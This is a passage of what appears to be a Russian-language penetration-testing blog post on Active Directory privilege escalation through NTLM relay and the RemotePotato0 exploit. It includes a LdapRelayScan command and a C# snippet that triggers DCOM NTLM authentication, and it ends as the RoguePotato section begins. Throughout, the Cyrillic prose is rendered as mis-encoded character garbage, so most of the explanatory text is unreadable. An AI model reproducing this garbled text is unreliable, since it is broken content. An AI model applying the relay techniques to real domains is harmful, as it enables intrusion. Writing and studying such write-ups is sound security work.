---
layout: post
title: "–£–¥–∞–ª–µ–Ω–Ω–∞—è–ö–∞—Ä—Ç–æ—à–∫–∞0. –ü–æ–≤—ã—à–∞–µ–º –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –≤ AD —á–µ—Ä–µ–∑ –∫—Ä–æ—Å—Å-–ø—Ä–æ—Ç–æ–∫–æ–ª—å–Ω—É—é –∞—Ç–∞–∫—É NTLM Relay"
date: 2022-12-30 03:00:00 +0300
author: snovvcrash
tags: [xss-is, xakep-ru, internal-pentest, active-directory, eop, pivoting, tunneling, ntlm-relay, dcom-rpc, potatoes, remotepotato0, cobalt-strike, impacket, ntlmrelayx]
---

[//]: # (2022-05-11)

–≠—Ç–∞ –∏—Å—Ç–æ—Ä–∏—è –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ ¬´–±–∞–π–∫–∏ —Å –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏—Ö –ø–µ–Ω—Ç–µ—Å—Ç–æ–≤¬ª, –∫–æ–≥–¥–∞ –º—ã –ø–æ–ø–∞–ª–∏ –≤ —Å—Ä–µ–¥—É Active Directory, –≥–¥–µ —á–ª–µ–Ω—ã –≥—Ä—É–ø–ø—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ Domain Users (–≤—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –¥–æ–º–µ–Ω–∞) –æ–±–ª–∞–¥–∞–ª–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–µ–π –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –∫–æ–Ω—Ç—Ä–æ–ª–ª–µ—Ä–∞–º –¥–æ–º–µ–Ω–∞ –ø–æ –ø—Ä–æ—Ç–æ–∫–æ–ª—É RDP. –•–æ—Ç—å —ç—Ç–æ —É–∂–µ —Å–∞–º–æ –ø–æ —Å–µ–±–µ —É–∂–∞—Å–Ω–∞—è ¬´–º–∏—Å–∫–æ–Ω—Ñ–∏–≥–∞¬ª, –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–π –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤—Å–µ –µ—â–µ –¥–æ–ª–∂–µ–Ω –Ω–∞–π—Ç–∏ —Å–ø–æ—Å–æ–± –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –Ω–∞ DC, —á—Ç–æ –ø—Ä–æ–±–ª–µ–º–∞—Ç–∏—á–Ω–æ, –µ—Å–ª–∏ –Ω–∞ —Å–∏—Å—Ç–µ–º–µ —Å—Ç–æ—è—Ç –≤—Å–µ —Ö–æ—Ç—Ñ–∏–∫—Å—ã. –ó–¥–µ—Å—å –∏ –ø—Ä–∏—Ö–æ–¥–∏—Ç –Ω–∞ –ø–æ–º–æ—â—å—é <strike>–±–∞–≥</strike> —Ñ–∏—á–∞ –∏–∑ —Å–µ—Ä–∏–∏ Microsoft Won't Fix List ‚Äì –∫—Ä–æ—Å—Å-—Å–µ—Å—Å–∏–æ–Ω–Ω–æ–µ –ø—Ä–æ–≤–æ—Ü–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—ã–Ω—É–∂–¥–µ–Ω–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø–æ –ø—Ä–æ—Ç–æ–∫–æ–ª—É RPC ‚Äì –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏ –æ—Ç—Å—É—Å—Ç–≤–∏–∏ –∑–∞—â–∏—Ç—ã —Å–ª—É–∂–±—ã LDAP –æ—Ç –∞—Ç–∞–∫ NTLM Relay –º–≥–Ω–æ–≤–µ–Ω–Ω–æ –ø–æ–¥–∞—Ä–∏—Ç —Ç–µ–±–µ ¬´–∫–ª—é—á–∏ –æ—Ç –ö–æ—Ä–æ–ª–µ–≤—Å—Ç–≤–∞¬ª. –í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –º—ã –ø–æ–≥–æ–≤–æ—Ä–∏–º –æ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö –≤–∞—Ä–∏–∞—Ü–∏—è—Ö –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è –¥–∞–Ω–Ω–æ–π –∞—Ç–∞–∫–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —ç–∫—Å–ø–ª–æ–∏—Ç–∞ RemotePotato0, –∞ —Ç–∞–∫–∂–µ –Ω–∞ —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ –æ–±—Å—É–¥–∏–º, –∫–∞–∫ –º–æ–∂–Ω–æ —Å–ø—Ä—è—Ç–∞—Ç—å —Å–∏–≥–Ω–∞—Ç—É—Ä—É –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ –æ—Ç —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞.

<!--cut-->

<p align="right">
  <a href="https://hackmag.com/security/remotepotato0/"><img src="https://img.shields.io/badge/F-HackMag-26a0c4?style=flat-square" alt="hackmag-badge.svg" /></a>
  <a href="https://xakep.ru/2022/08/26/remotepotato0/"><img src="https://img.shields.io/badge/%5d%5b-%d0%a5%d0%b0%d0%ba%d0%b5%d1%80-red?style=flat-square" alt="xakep-badge.svg" /></a>
  <a href="https://xss.is/threads/66892/"><img src="https://img.shields.io/badge/%7e%2f-XSS.is-00a150?style=flat-square" alt="xss-badge.svg" /></a>
</p>

> **WARNING**
>
> –°—Ç–∞—Ç—å—è –∏–º–µ–µ—Ç –æ–∑–Ω–∞–∫–æ–º–∏—Ç–µ–ª—å–Ω—ã–π —Ö–∞—Ä–∞–∫—Ç–µ—Ä –∏ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è —Å–ø–µ—Ü–∏–∞–ª–∏—Å—Ç–æ–≤ –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –ø—Ä–æ–≤–æ–¥—è—â–∏—Ö —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ —Ä–∞–º–∫–∞—Ö –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞. –ê–≤—Ç–æ—Ä –Ω–µ –Ω–µ—Å–µ—Ç –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏ –∑–∞ –ª—é–±–æ–π –≤—Ä–µ–¥, –ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—ã–π —Å –ø—Ä–∏–º–µ–Ω–µ–Ω–∏–µ–º –∏–∑–ª–æ–∂–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏. –†–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º, –Ω–∞—Ä—É—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã —Å–∏—Å—Ç–µ–º –∏ –Ω–∞—Ä—É—à–µ–Ω–∏–µ —Ç–∞–π–Ω—ã –ø–µ—Ä–µ–ø–∏—Å–∫–∏ –ø—Ä–µ—Å–ª–µ–¥—É—é—Ç—Å—è –ø–æ –∑–∞–∫–æ–Ω—É.

[![banner.png](/assets/images/remote-potato-0/banner.png)](/assets/images/remote-potato-0/banner.png)
{:.center-image}

* TOC
{:toc}

# –ü—Ä–µ–¥—ã—Å—Ç–æ—Ä–∏—è

–ò—Ç–∞–∫, –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π –ø–µ–Ω—Ç–µ—Å—Ç. –í—Å–µ –ø–æ –∫–ª–∞—Å—Å–∏–∫–µ: —Ç–æ–ª—å–∫–æ —è, –º–æ–π –Ω–æ—É—Ç–±—É–∫,<strike>–∫–∞–ø—é—à–æ–Ω —Å –º–∞—Å–∫–æ–π –ì–∞—è –§–æ–∫—Å–∞,</strike> –ø–µ—Ä–µ–≥–æ–≤–æ—Ä–∫–∞, —Å–∫–æ–º–º—É—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Ä–æ–∑–µ—Ç–∫–∞ RJ-45 –∏ –ø—Ä–æ—Å—Ç–æ—Ä—ã –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–æ–π —Å–µ—Ç–∏ –∂–µ—Ä—Ç–≤—ã –∞—É–¥–∏—Ç–∞. –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –ø—Ä–∞–≤–∏–ª —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ IPv6 –≤ –º–æ–µ–º —à–∏—Ä–æ–∫–æ–≤–µ—â–∞—Ç–µ–ª—å–Ω–æ–º –¥–æ–º–µ–Ω–µ ‚Äì –≤ —Ä–æ–ª–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏, –æ—Ç—Ä–∞–≤–ª–µ–Ω–Ω—ã–µ –ø–∞–∫–µ—Ç—ã DHCPv6 Advertise —Å link-local IPv6-–∞–¥—Ä–µ—Å–æ–º –º–æ–µ–≥–æ –Ω–æ—É—Ç–±—É–∫–∞ ([mitm6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)) ‚Äì –≤ —Ä–æ–ª–∏ –∞—Ç–∞–∫–∏, –∏ –≤–æ—Ç –ø–æ–ª—É—á–µ–Ω –ø–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω—ã–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø –≤ —Å—Ä–µ–¥—É AD. –î–∞–ª–µ–µ —Å–±–æ—Ä –¥–∞–º–ø–∞ ¬´–±–ª–∞–¥–∞¬ª —Å –ø–æ–º–æ—â—å—é [BloodHound.py](https://github.com/fox-it/BloodHound.py), –ø–æ–∫–∞ –≤—Å–µ –ø–æ –∫–ª–∞—Å—Å–∏–∫–µ. –ù–æ –≤–æ—Ç —Ç–æ, —á—Ç–æ –±—ã–ª–æ –¥–∞–ª—å—à–µ, –ü–û–í–ï–†–ì–õ–û –í–°–ï–• –í –®–û–ö (–ü–ï–†–ï–ô–î–ò –ü–û –°–°–´–õ–ö–ï –î–õ–Ø –ü–†–û–î–û–õ–ñ–ï–ù–ò–Ø)...

–®—É—á—É, –≤—Å–µ–≥–æ –ª–∏—à—å –≤—Å–µ –¥–æ–º–µ–Ω–Ω—ã–µ ¬´–ø–æ–ª—å–∑–∞–∫–∏¬ª –º–æ–≥—É—Ç –∫–æ–Ω–Ω–µ–∫—Ç–∏—Ç—å—Å—è –∫ –∫–æ–Ω—Ç—Ä–æ–ª–ª–µ—Ä–∞–º –¥–æ–º–µ–Ω–∞ –ø–æ RDP, —á—Ç–æ –º–æ–∂–µ—Ç –ø–æ–π—Ç–∏ –Ω–µ —Ç–∞–∫?

[![–ù–∞–π–¥–∏ —É—è–∑–≤–∏–º–æ—Å—Ç—å –Ω–∞ –∫–∞—Ä—Ç–∏–Ω–∫–µ](/assets/images/remote-potato-0/bloodhound.png)](/assets/images/remote-potato-0/bloodhound.png)
{:.center-image}

–ù–∞–π–¥–∏ —É—è–∑–≤–∏–º–æ—Å—Ç—å –Ω–∞ –∫–∞—Ä—Ç–∏–Ω–∫–µ
{:.quote}

–ù–∞ —Å–∞–º–æ–º –¥–µ–ª–µ, —É–∂–µ –≤ —ç—Ç–æ—Ç –º–æ–º–µ–Ω—Ç –º–æ–∂–Ω–æ –Ω–∞—á–∏–Ω–∞—Ç—å –ø–æ—Ç–∏—Ä–∞—Ç—å —Ä—É–∫–∏ –≤ –ø—Ä–µ–¥–≤–∫—É—à–µ–Ω–∏–∏ –∫—Ä–µ–¥–æ–≤ –¥–æ–º–µ–Ω–∞–¥–º–∏–Ω–∞. –£–±–µ–¥–∏–º—Å—è, —á—Ç–æ –º—ã –º–æ–∂–µ–º —Ä–µ–ª–µ–∏—Ç—å Net-NTLMv2 –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –Ω–∞ —Å–ª—É–∂–±—ã LDAP(S) —Å –ø–æ–º–æ—â—å—é [LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan).

```
~$ python3 LdapRelayScan.py -method BOTH -dc-ip <REDACTED> -u <REDACTED> -p <REDACTED>
```

[![PARTY TIME!](/assets/images/remote-potato-0/ldaprelayscan.png)](/assets/images/remote-potato-0/ldaprelayscan.png)
{:.center-image}

PARTY TIME!
{:.quote}

–ù–µ—É–¥–∏–≤–∏—Ç–µ–ª—å–Ω–æ, —á—Ç–æ [LDAP Signing](https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a) (–∑–∞—â–∏—Ç–∞ LDAP, 389/TCP) –∏ [LDAP Channel Binding](https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a) (–∑–∞—â–∏—Ç–∞ LDAPS, 636/TCP) –æ—Ç–∫–ª—é—á–µ–Ω—ã ‚Äì –µ—â–µ –º–∞–ª–æ –∫—Ç–æ –æ—Å–æ–∑–Ω–∞–ª, —á—Ç–æ —ç—Ç–æ ¬´–º–∞—Å—Ç—Ö—ç–≤¬ª-mitigations –ê–î –≤ –Ω–∞—à–µ –≤—Ä–µ–º—è.

–ê —Ç–µ–ø–µ—Ä—å –ø–æ –ø–æ—Ä—è–¥–∫—É, —á—Ç–æ —Å–æ –≤—Å–µ–º —ç—Ç–∏–º –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å...

# –ù–µ–º–Ω–æ–≥–æ –æ ¬´–∫–∞—Ä—Ç–æ—à–∫–∞—Ö¬ª

## RottenPotato & Co.

–í –¥–∞–ª–µ–∫–æ–º 2016 –≥. —É–º–Ω—ã–µ –ª—é–¥–∏ –ø—Ä–∏–¥—É–º–∞–ª–∏ [RottenPotato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) ‚Äì —Ç–µ—Ö–Ω–∏–∫—É –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π —Å —Å–µ—Ä–≤–∏—Å–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ Windows (–Ω–∞–ø—Ä–∏–º–µ—Ä, `IIS APPPOOL\DefaultAppPool` –∏–ª–∏ `NT Service\MSSQL$SQLEXPRESS`), –æ–±–ª–∞–¥–∞—é—â–∏—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–µ–π –æ–ª–∏—Ü–µ—Ç–≤–æ—Ä–µ–Ω–∏—è —á—É–∂–∏—Ö —Ç–æ–∫–µ–Ω–æ–≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (aka *SeImpersonatePrivilege*), –¥–æ `NT AUTHORITY\SYSTEM`.

–î–ª—è —ç—Ç–æ–≥–æ –∞—Ç–∞–∫—É—é—â–∏–π –¥–æ–ª–∂–µ–Ω –±—ã–ª:

1. –°–ø—Ä–æ–≤–æ—Ü–∏—Ä–æ–≤–∞—Ç—å –≤—ã–Ω—É–∂–¥–µ–Ω–Ω—É—é –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é —Å–æ —Å—Ç–æ—Ä–æ–Ω—ã `NT AUTHORITY\SYSTEM` –Ω–∞ –º–∞—à–∏–Ω–µ-–∂–µ—Ä—Ç–≤–µ —á–µ—Ä–µ–∑ —Ç—Ä–∏–≥–≥–µ—Ä API-—Ä—É—á–∫–∏ DCOM/RPC `CoGetInstanceFromIStorage` –≤ –æ—Ç–Ω–æ—à–µ–Ω–∏–∏ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Å–ª—É—à–∞—Ç–µ–ª—è (–≤—ã—Å—Ç—É–ø–∞–µ—Ç –≤ —Ä–æ–ª–∏ ¬´—á–µ–ª–æ–≤–µ–∫–∞ –ø–æ—Å–µ—Ä–µ–¥–∏–Ω–µ¬ª).
2. –û–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –ø—Ä–æ–≤–µ—Å—Ç–∏ **–ª–æ–∫–∞–ª—å–Ω—É—é** –∞—Ç–∞–∫—É NTLM Relay –Ω–∞ —Å–ª—É–∂–±—É RPC (135/TCP) –∏ –¥–µ—Ä–Ω—É—Ç—å API-–≤—ã–∑–æ–≤ DCOM/RPC `AcceptSecurityContext`, –ø–µ—Ä–µ–¥–∞–≤–∞—è –µ–º—É —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ NTLM-—á–∞—Å—Ç–∏ –∑–∞–ø—Ä–æ—Å–∞ Negotiate (NTLM Type 1) –æ—Ç `NT AUTHORITY\SYSTEM`.
3. –ü–æ–¥–º–µ–Ω–∏—Ç—å NTLM-—á–µ–ª–ª–µ–Ω–¥–∂ (NTLM Type 2), –∏—Å—Ö–æ–¥—è—â–∏–π –æ—Ç —Å–ª—É–∂–±—ã RPC (135/TCP), –Ω–∞ —á–µ–ª–ª–µ–Ω–¥–∂, –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –∏–∑ –æ—Ç–≤–µ—Ç–∞ `AcceptSecurityContext`, –∏ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –∏–∑–Ω–∞—á–∞–ª—å–Ω—ã–π —Ä–µ–ª–µ–π –Ω–∞ RPC –∏–∑ —à–∞–≥–∞ 1. –í –¥–∞–Ω–Ω–æ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ NTLM-–æ—Ç–≤–µ—Ç —Å–ª—É–∂–±—ã RPC (135/TCP) –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø—Ä–æ—Å—Ç–æ –∫–∞–∫ —à–∞–±–ª–æ–Ω —Å–µ—Ç–µ–≤–æ–≥–æ –æ—Ç–≤–µ—Ç–∞, –≤ –∫–æ—Ç–æ—Ä—ã–π –º—ã –∏–Ω–∂–µ–∫—Ç–∏–º –Ω—É–∂–Ω–æ–µ –Ω–∞–º —Ç–µ–ª–æ NTLM-—á–µ–ª–ª–µ–Ω–¥–∂–∞.
4. –ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ (NTLM Type 3) –∫–ª–∏–µ–Ω—Ç–∞ RPC –∏–∑ —à–∞–≥–∞ 1 –≤ –æ—Ç–≤–µ—Ç –Ω–∞ NTLM-—á–µ–ª–ª–µ–Ω–¥–∂ (NTLM Type 2) –∏–∑ —à–∞–≥–∞ 3 –∑–∞—Ä–µ–ª–µ–∏—Ç—å –µ–µ –Ω–∞ RPC-—Ä—É—á–∫—É `AcceptSecurityContext` –∏ –ø–æ–ª—É—á–∏—Ç—å —Ç–æ–∫–µ–Ω —Å–∏—Å—Ç–µ–º—ã. –ù–∞ —ç—Ç–æ–º NTLM Relay –æ–∫–æ–Ω—á–µ–Ω.
5. –ò–º–ø–µ—Ä—Å–æ–Ω–∏—Ä–æ–≤–∞—Ç—å (–æ–ª–∏—Ü–µ—Ç–≤–æ—Ä–∏—Ç—å) `NT AUTHORITY\SYSTEM`. –ú—ã –º–æ–∂–µ–º —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å –≤ —Å–∏–ª—É –Ω–∞–ª–∏—á–∏—è —É –Ω–∞—Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ *SeImpersonatePrivilege*.

[![–ú–µ—Ö–∞–Ω–∏–∑–º —Ä–∞–±–æ—Ç—ã RottenPotato (–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ ‚Äì jlajara.gitlab.io)](/assets/images/remote-potato-0/rottenpotato-scheme.png)](/assets/images/remote-potato-0/rottenpotato-scheme.png)
{:.center-image}

–ú–µ—Ö–∞–Ω–∏–∑–º —Ä–∞–±–æ—Ç—ã RottenPotato (–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ ‚Äì jlajara.gitlab.io)
{:.quote}

–ù–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è —Å–ø—É—Å—Ç—è –ª–∞–≤–æ—á–∫—É –ø—Ä–∏–∫—Ä—ã–ª–∏, –∑–∞–ø—Ä–µ—Ç–∏–≤ DCOM/RPC –æ–±—â–∞—Ç—å—Å—è —Å –ª–æ–∫–∞–ª—å–Ω—ã–º–∏ —Å–ª—É—à–∞—Ç–µ–ª—è–º–∏ ‚Äì –Ω–∏–∫–∞–∫–∏—Ö —Ç–µ–±–µ –±–æ–ª—å—à–µ –ú–∏—Ç–ú-–æ–≤. –ù–æ ¬´–∫–∞—Ä—Ç–æ—à–∫–∏¬ª –≤—Å–µ —Ä–∞–≤–Ω–æ –ø—Ä–µ—Ç–µ—Ä–ø–µ–≤–∞–ª–∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è: –±—ã–ª–∏ –Ω–∞–ø–∏–ª–µ–Ω—ã [LonelyPotato](https://github.com/decoder-it/lonelypotato) (–Ω–µ–∞–∫—Ç—É–∞–ª—å–Ω–æ) –∏ [JuicyPotato](https://ohpe.it/juicy-potato/) ‚Äì —É–ª—É—á—à–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è RottenPotato, —É–º–µ—é—â–∞—è —Ä–∞–±–æ—Ç–∞—Ç—å [—Å —Ä–∞–∑–Ω—ã–º–∏ –∑–Ω–∞—á–µ–Ω–∏—è–º–∏](https://ohpe.it/juicy-potato/CLSID/) CLSID (Class ID, –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä COM-–∫–ª–∞—Å—Å–∞) –¥–ª—è ¬´–∞—Ä–±—É–∑–∏–Ω–≥–∞¬ª –¥—Ä—É–≥–∏—Ö —Å–ª—É–∂–± (–ø–æ–º–∏–º–æ [BITS](https://docs.microsoft.com/ru-ru/windows/win32/bits/background-intelligent-transfer-service-portal), –∫–æ—Ç–æ—Ä—É—é –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–∞—è ¬´–∫–∞—Ä—Ç–æ—à–∫–∞¬ª), –≤ –∫–æ—Ç–æ—Ä—ã—Ö —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å [IMarshal](https://docs.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal) –¥–ª—è —Ç—Ä–∏–≥–≥–µ—Ä–∞ NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏.

–í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ –ø—Ä–æ—Ü–µ—Å—Å –ø—Ä–æ–≤–æ—Ü–∏—Ä–æ–≤–∞–Ω–∏—è NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –≤ —Å–≤–æ–µ–π –æ—Å–Ω–æ–≤–µ –∏–º–µ–µ—Ç —Å—Ö–æ–∂–µ–π –ø—Ä–∏–Ω—Ü–∏–ø —Å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –¥–µ—Å–µ—Ä–∏–∞–ª–∏–∑–∞—Ü–∏–µ–π –æ–±—ä–µ–∫—Ç–æ–≤, —Ç–æ–ª—å–∫–æ –∑–¥–µ—Å—å —ç—Ç–æ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è ¬´[–∞–Ω–º–∞—Ä—à–∞–ª–∏–Ω–≥](https://ru.wikipedia.org/wiki/%D0%9C%D0%B0%D1%80%D1%88%D0%B0%D0%BB%D0%B8%D0%BD%D0%B3)¬ª ‚Äì –ø—Ä–æ—Ü–µ—Å—Å –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è COM-–æ–±—ä–µ–∫—Ç–∞ –∏–∑ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –±–∏—Ç –ø–æ—Å–ª–µ –µ–≥–æ –ø–µ—Ä–µ–¥–∞—á–∏ –≤ —Ü–µ–ª–µ–≤–æ–π –º–µ—Ç–æ–¥ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∞—Ä–≥—É–º–µ–Ω—Ç–∞.

–ê—Ç–∞–∫—É—é—â–∏–π —Å–æ–∑–¥–∞–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π COM-–æ–±—ä–µ–∫—Ç –∫–ª–∞—Å—Å–∞ `IStorage` –∏ –≤—ã–∑—ã–≤–∞–µ—Ç API `CoGetInstanceFromIStorage` —Å —É–∫–∞–∑–∞–Ω–∏–µ–º **—Å–æ–∑–¥–∞—Ç—å** –æ–±—ä–µ–∫—Ç –∫–ª–∞—Å—Å–∞ —Å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–º –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º CLSID –∏ **–∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å** –µ–≥–æ —Å–æ—Å—Ç–æ—è–Ω–∏–µ–º –∏–∑ –º–∞—Ä—à–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –æ–±—ä–µ–∫—Ç–∞. –û–¥–Ω–æ –∏–∑ –ø–æ–ª–µ–π –º–∞—Ä—à–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –æ–±—ä–µ–∫—Ç–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–æ–¥–∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–π –∞—Ç–∞–∫—É—é—â–µ–º—É —Å–ª—É—à–∞—Ç–µ–ª—å, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏—Ö–æ–¥–∏—Ç –æ—Ç—Å—Ç—É–∫ —Å NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –∞–Ω–º–∞—Ä—à–∞–ª–∏–Ω–≥–∞.

```cpp
public static void BootstrapComMarshal(int port)
{
    IStorage stg = ComUtils.CreateStorage();

    // Use a known local system service COM server, in this cast BITSv1
    Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");

    TestClass c = new TestClass(stg, String.Format("127.0.0.1[{0}]", port));

    MULTI_QI[] qis = new MULTI_QI[1];

    qis[0].pIID = ComUtils.IID_IUnknownPtr;
    qis[0].pItf = null;
    qis[0].hr = 0;

    CoGetInstanceFromIStorage(null, ref clsid,
        null, CLSCTX.CLSCTX_LOCAL_SERVER, c, 1, qis);
}
```

–ü–æ–¥—Ä–æ–±–Ω–µ–µ –æ –º–µ—Ö–∞–Ω–∏–∑–º–µ —Ç—Ä–∏–≥–≥–µ—Ä–∞ NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –≤ —Ö–æ–¥–µ –∞–±—å—é–∑–∞ DCOM/RPC –º–æ–∂–Ω–æ –ø–æ—á–∏—Ç–∞—Ç—å –≤ –ø–µ—Ä–≤–æ–º —Ä–µ–ø–æ—Ä—Ç–µ –Ω–∞ —ç—Ç—É —Ç–µ–º—É: https://bugs.chromium.org/p/project-zero/issues/detail?id=325.

## RoguePotato

–° —Ä–µ–ª–∏–∑–æ–º [RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/) ‚Äì —ç–≤–æ–ª—é—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–≤—à–µ–π –≤–µ—Ä—Å–∏–µ–π JuicyPotato ‚Äì –±—ã–ª –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –ø–æ–¥—Ö–æ–¥ –∫ –æ–ª–∏—Ü–µ—Ç–≤–æ—Ä–µ–Ω–∏—é –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤:

